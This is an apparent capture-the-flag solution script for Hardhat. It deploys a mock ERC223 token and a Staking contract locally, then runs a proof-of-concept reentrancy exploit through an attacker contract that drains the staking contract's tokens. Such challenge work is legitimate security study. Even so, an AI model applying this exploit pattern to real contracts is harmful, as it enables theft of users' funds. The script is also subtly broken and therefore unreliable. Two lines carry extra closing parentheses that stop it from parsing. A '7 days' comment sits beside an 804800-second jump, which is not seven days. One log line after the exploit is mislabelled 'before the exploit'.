const { expect } = require("chai");
const { ethers } = require("hardhat");
const { blockchainNow, setBlockchainTime } = require("./utils/helpers.js");
const abiCoder = ethers.utils.defaultAbiCoder; //An AbiCoder created when the library is imported which is used by the Interface.

const ONE_ETHER = ethers.utils.parseUnits("1", "ether");
const FIFTY_ETHER = ethers.utils.parseUnits("50", "ether");
const REWARD_AMOUNT = ethers.utils.parseUnits("0.1", "ether");

async function deploy(deployer) {
    let deployTokens = ethers.utils.parseUnits("10000", "ether");

    // Deploy ERC223 token
    const mockERC223 = await ethers.getContractFactory("MockERC223", deployer);
    const mtoken = await mockERC223.deploy(deployTokens);
    await expect(await mtoken.connect(deployer).balanceOf(deployer.address)).to.equal(deployTokens);

    // Deploy Staking contract
    const Staking = await ethers.getContractFactory("Staking", deployer);
    const staking = await Staking.deploy(mtoken.address, REWARD_AMOUNT, { value: FIFTY_ETHER.mul(5) });
    await expect(await staking.token()).to.equal(mtoken.address);
    await expect(await ethers.provider.getBalance(staking.address)).to.equal(FIFTY_ETHER.mul(5));

    return [mtoken, staking];
}

async function main() {
    console.log("CHALLENGE - 2\n");
    let [deployer, user1, attacker] = await ethers.getSigners();
    let [mtoken, staking] = await deploy(deployer);

    console.log("ERC223 token :", mtoken.address);
    console.log("STAKING contract :", staking.address);

    await mtoken.connect(deployer)["transfer(address,uint256)"](user1.address, FIFTY_ETHER.mul(10));
    await mtoken.connect(deployer)["transfer(address,uint256)"](attacker.address, FIFTY_ETHER);

    // user1 staking in the contract.
    await mtoken.connect(user1)["transfer(address,uint256)"](staking.address, FIFTY_ETHER.mul(10));

    // POC
    
    console.log("EXPLOIT : \n");
    
    const Malicious = await ethers.getContractFactory("ERC223Reentrant", attacker);
    const malicious = await Malicious.deploy(mtoken.address,staking.address);

    console.log("Malicious contract :", malicious.address);
    await mtoken.connect(deployer)["transfer(address,uint256,bytes)"](malicious.address,FIFTY_ETHER,abiCoder.encode(["string"], ["skip"]));

    await expect(await mtoken.balanceOf(malicious.address)).to.equal(FIFTY_ETHER));

    // staking into the vulnerable contract
    await malicious.enter(FIFTY_ETHER);
    
    console.log("Balance of staking contract before the exploit : ", await ethers.utils.formatEther(await staking.balanceOf(malicious.address)));

    // time travel till 7 days elapse
    await setBlockchainTime(await blockchainNow() + 804800);
    await malicious.exit();

    console.log("Balance of staking contract before the exploit : ",await ethers.utils.formatEther(await mtoken.balanceOf(staking.address)));
    console.log("Balance of malicious contract after the exploit : ", await ethers.utils.formatEther(await mtoken.balanceOf(malicious.address))));
}

main();
